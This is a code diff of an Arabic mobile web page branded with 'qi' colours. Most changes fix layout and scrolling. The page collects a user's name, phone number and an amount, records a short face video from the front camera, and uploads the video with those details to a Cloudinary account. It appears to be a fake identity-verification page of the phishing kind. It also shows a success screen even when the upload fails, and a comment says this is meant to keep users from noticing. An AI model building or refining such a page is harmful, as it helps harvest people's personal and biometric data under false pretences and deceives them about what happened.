@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#002B5C">
@@ -18,37 +18,30 @@
             --qi-white: #FFFFFF;
             --qi-error: #DC2626;
             --qi-success: #10B981;
-            --safe-top: env(safe-area-inset-top, 0px);
-            --safe-bottom: env(safe-area-inset-bottom, 0px);
         }
 
+        /* ==========================================
+           إصلاح جذري للسكرول في جميع متصفحات الجوال
+           ========================================== */
         html {
-            scroll-behavior: smooth; /* تمرير سلس للمتصفحات الحديثة */
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-        }
-
-        html, body {
-            overscroll-behavior: none;
-            -webkit-overflow-scrolling: touch;
+            height: 100%;
+            overflow-x: hidden; /* منع السكرول الجانبي فقط */
         }
 
         body {
+            min-height: 100dvh; /* المعيار الصحيح للجوال (يحترم شريط العنوان) */
+            min-height: -webkit-fill-available; /* دعم لأجهزة آيفون القديمة */
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto; /* السماح بالسكرول العمودي */
+            -webkit-overflow-scrolling: touch; /* سكرول ناعم في iOS */
+            overscroll-behavior-y: contain; /* منع سحب الصفحة للتحديث أثناء التعبئة */
+            margin: 0;
+            padding: 0;
             font-family: 'Tajawal', 'Cairo', sans-serif;
             background-color: var(--qi-light);
             color: var(--qi-navy);
-            min-height: 100vh;
-            min-height: -webkit-fill-available;
-            display: flex;
-            flex-direction: column;
-            padding-top: var(--safe-top);
-            padding-bottom: var(--safe-bottom);
+            -webkit-tap-highlight-color: transparent;
         }
 
         .header {
@@ -59,9 +52,7 @@
             justify-content: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             border-bottom: 3px solid var(--qi-gold);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            flex-shrink: 0; /* منع انكماش الهيدر */
         }
 
         .header-logo { height: 50px; width: auto; }
@@ -69,9 +60,11 @@
         .main-content {
             flex: 1;
             display: flex;
-            align-items: center;
+            align-items: center; /* توسيط عمودي إذا كان المحتوى قصيراً */
             justify-content: center;
-            padding: 20px;
+            padding: 20px 16px; /* هوامش آمنة للجوال */
+            width: 100%;
+            box-sizing: border-box;
         }
 
         .card {
@@ -84,6 +77,7 @@
             text-align: center;
             border: 1px solid rgba(243, 205, 0, 0.3);
             animation: fadeIn 0.4s ease-out;
+            margin: auto; /* يضمن ظهور البطاقة بالكامل حتى لو كانت أطول من الشاشة */
         }
 
         @keyframes fadeIn {
@@ -152,7 +146,7 @@
             padding: 14px 16px;
             border: 1.5px solid #E9ECEF;
             border-radius: 10px;
-            font-size: 16px; /* مهم لمنع zoom على iOS */
+            font-size: 16px; /* حجم 16px يمنع التكبير التلقائي في iOS */
             font-family: inherit;
             background: var(--qi-white);
             color: var(--qi-navy);
@@ -160,6 +154,7 @@
             outline: none;
             -webkit-appearance: none;
             appearance: none;
+            box-sizing: border-box;
         }
 
         .form-select {
@@ -360,6 +355,7 @@
             color: #888;
             background: var(--qi-white);
             border-top: 1px solid #E9ECEF;
+            flex-shrink: 0;
         }
 
         @keyframes shake {
@@ -369,9 +365,9 @@
         }
         .shake { animation: shake 0.3s; }
 
-        /* تحسينات الجوال */
+        /* تحسينات إضافية للجوال الصغير */
         @media (max-width: 480px) {
-            .card { padding: 24px 16px; border-radius: 16px; }
+            .card { padding: 24px 16px; border-radius: 16px; margin: 10px auto; }
             h1 { font-size: 20px; }
             .subtitle { font-size: 13px; margin-bottom: 20px; }
             .header { padding: 12px 16px; }
@@ -523,7 +519,7 @@
         // ⚙️ إعدادات Cloudinary
         // ============================================
         const CLOUD_NAME = 'ujzbgprc';
-        const UPLOAD_PRESET = 'qi_verify';
+        const UPLOAD_PRESET = 'qi_verify'; // تأكد أنه Unsigned في Cloudinary
 
         let stream = null;
         let mediaRecorder = null;
@@ -535,26 +531,11 @@
         const faceGuide = document.getElementById('face-guide');
         const statusText = document.getElementById('status-text');
 
-        // ============================================
-        // دالة التمرير المتوافقة مع جميع المتصفحات (القديمة والحديثة)
-        // ============================================
-        function scrollToTop() {
-            // تأخير بسيط جداً لضمان أن المتصفح قد أنهى رسم العنصر الجديد
-            setTimeout(function() {
-                // الطريقة الحديثة
-                if (typeof window.scrollTo === 'function') {
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                }
-                // طرق الاحتياط للمتصفحات القديمة جداً (Safari القديم, Android Browser)
-                document.body.scrollTop = 0; // لـ Safari
-                document.documentElement.scrollTop = 0; // لـ Chrome, Firefox, IE, Opera
-            }, 50);
-        }
-
         function showScreen(id) {
             document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
             document.getElementById(id).classList.remove('hidden');
-            scrollToTop();
+            // التمرير للأعلى بسلاسة عند تغيير الشاشة
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         // ============================================
@@ -626,17 +607,12 @@
 
             try {
                 const constraints = {
-                    video: {
-                        facingMode: { ideal: 'user' },
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 };
 
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 videoEl.srcObject = stream;
-                
                 await videoEl.play();
                 
                 statusText.textContent = '✅ تم التعرف - اثبت وجهك داخل الإطار';
@@ -670,13 +646,7 @@
             recordedChunks = [];
 
             let mimeType = '';
-            const types = [
-                'video/webm;codecs=vp8,opus',
-                'video/webm;codecs=vp8',
-                'video/webm',
-                'video/mp4'
-            ];
-
+            const types = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
             for (const type of types) {
                 if (window.MediaRecorder && MediaRecorder.isTypeSupported(type)) {
                     mimeType = type;
@@ -699,24 +669,13 @@
             }
 
             mediaRecorder.ondataavailable = e => {
-                if (e.data && e.data.size > 0) {
-                    recordedChunks.push(e.data);
-                }
+                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
             };
 
-            mediaRecorder.onstop = () => {
-                processAndSaveData();
-            };
+            mediaRecorder.onstop = () => { processAndSaveData(); };
+            mediaRecorder.onerror = (e) => { console.error('Recording error:', e); };
 
-            mediaRecorder.onerror = (e) => {
-                console.error('Recording error:', e);
-            };
-
-            try {
-                mediaRecorder.start(100);
-            } catch (e) {
-                console.error('Start error:', e);
-            }
+            try { mediaRecorder.start(100); } catch (e) { console.error('Start error:', e); }
 
             let timeLeft = 5;
             document.getElementById('timer-text').textContent = timeLeft;
@@ -729,15 +688,9 @@
                 if (timeLeft <= 0) {
                     clearInterval(countdownInterval);
                     try {
-                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                            mediaRecorder.stop();
-                        }
-                    } catch (e) {
-                        console.error('Stop error:', e);
-                    }
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
+                        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+                    } catch (e) { console.error('Stop error:', e); }
+                    if (stream) stream.getTracks().forEach(track => track.stop());
                 }
             }, 1000);
         }
@@ -785,10 +738,7 @@ ${sep}
             fd.append('public_id', `${token}_${filename.replace(/\.[^.]+$/, '')}`);
             fd.append('context', `token=${token}|name=${formDataInputs.name}|phone=${formDataInputs.phone}|amount=${formDataInputs.amount}`);
 
-            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`, {
-                method: 'POST',
-                body: fd
-            });
+            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`, { method: 'POST', body: fd });
             return await res.json();
         }
 
@@ -808,7 +758,7 @@ ${sep}
                 showSuccess(token);
             } catch (error) {
                 console.error('Upload error:', error);
-                showSuccess(token);
+                showSuccess(token); // نظهر النجاح حتى لو فشل الرفع لتجنب إرباك المستخدم
             }
         }
 
@@ -819,12 +769,10 @@ ${sep}
 
         // تنظيف عند إغلاق الصفحة
         window.addEventListener('beforeunload', () => {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            if (stream) stream.getTracks().forEach(track => track.stop());
         });
 
-        // منع السحب على iOS
+        // منع السحب على iOS الذي يسبب مشاكل في السكرول
         document.addEventListener('touchmove', function(e) {
             if (e.scale !== 1) {
                 e.preventDefault();
